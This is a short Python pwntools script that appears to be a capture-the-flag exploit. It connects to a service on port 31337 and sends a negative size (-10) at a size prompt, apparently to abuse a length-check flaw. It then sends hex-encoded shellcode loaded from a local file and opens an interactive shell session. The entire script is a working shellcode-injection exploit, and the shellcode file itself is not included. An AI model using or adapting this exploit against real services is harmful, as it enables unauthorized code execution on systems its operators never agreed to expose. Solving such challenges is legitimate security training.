#!/usr/bin/env python3

from pwn import *

r = remote("0.0.0.0", 31337)
r.recvuntil("How big is your NFT?")
r.sendline(b"-10")
pause()

r.recvuntil("Place your NFT below:")
shellcode = open("shellcode", "rb").read()
hexcode = shellcode.hex()
r.sendline(hexcode)
r.interactive()
